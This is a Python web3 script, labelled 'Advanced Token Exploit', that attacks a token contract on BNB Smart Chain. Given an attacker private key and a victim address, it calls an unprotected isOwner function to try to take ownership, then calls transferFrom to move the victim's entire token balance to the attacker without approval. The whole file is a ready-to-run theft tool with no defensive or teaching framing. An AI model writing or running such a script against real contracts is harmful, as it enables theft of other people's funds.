from web3 import Web3
import argparse
from web3.middleware import geth_poa_middleware

# Setup
parser = argparse.ArgumentParser(description="Advanced Token Exploit")
parser.add_argument("--private-key", required=True, help="Attacker private key")
parser.add_argument("--rpc-url", default="https://bsc.publicnode.com", help="BSC RPC URL")
parser.add_argument("--token-address", required=True, help="Token contract address")
parser.add_argument("--victim-address", required=True, help="Victim address")
args = parser.parse_args()

w3 = Web3(Web3.HTTPProvider(args.rpc_url))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)
account = w3.eth.account.from_key(args.private_key)

# Enhanced ABI with approve function
TOKEN_ABI = [
    # Ownership
    {
        "inputs": [{"internalType": "address", "name": "a", "type": "address"}], 
        "name": "isOwner",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    # Token functions
    {
        "inputs": [{"internalType": "address", "name": "account", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "from", "type": "address"},
            {"internalType": "address", "name": "to", "type": "address"},
            {"internalType": "uint256", "name": "amount", "type": "uint256"}
        ],
        "name": "transferFrom",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "owner", "type": "address"},
            {"internalType": "address", "name": "spender", "type": "address"}
        ],
        "name": "allowance",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "spender", "type": "address"},
            {"internalType": "uint256", "name": "amount", "type": "uint256"}
        ],
        "name": "approve",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

def execute_exploit():
    token = w3.eth.contract(address=args.token_address, abi=TOKEN_ABI)
    
    print(f"\n[+] Target: {token.address}")
    print(f"[+] Victim: {args.victim_address}")
    print(f"[+] Attacker: {account.address}")
    
    # 1. Check initial state
    victim_bal = token.functions.balanceOf(args.victim_address).call()
    print(f"\n[1] Victim Balance: {victim_bal}")
    
    # 2. Become owner
    print("\n[2] Attempting to become owner...")
    tx = token.functions.isOwner(account.address).build_transaction({
        "from": account.address,
        "nonce": w3.eth.get_transaction_count(account.address),
        "gas": 500_000,
        "gasPrice": w3.eth.gas_price
    })
    signed = account.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"TX Status: {'Success' if receipt.status == 1 else 'Failed'}")
    
    # 3. Bypass allowance check (as owner)
    print("\n[3] Attempting transfer without allowance...")
    try:
        tx = token.functions.transferFrom(
            args.victim_address,
            account.address,
            victim_bal
        ).build_transaction({
            "from": account.address,
            "nonce": w3.eth.get_transaction_count(account.address),
            "gas": 500_000,
            "gasPrice": w3.eth.gas_price
        })
        signed = account.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        
        print(f"\n[+] Transfer Results:")
        print(f"TX Hash: {tx_hash.hex()}")
        print(f"Status: {'Success' if receipt.status == 1 else 'Failed'}")
        if receipt.status == 0:
            print("Reason: The contract likely still requires allowance even for owners")
        
        # Check new balance
        new_bal = token.functions.balanceOf(args.victim_address).call()
        print(f"New Victim Balance: {new_bal}")
        
    except Exception as e:
        print(f"\n[!] Transfer failed: {str(e)}")
        print("The contract has additional protections preventing the transfer")

if __name__ == "__main__":
    execute_exploit()
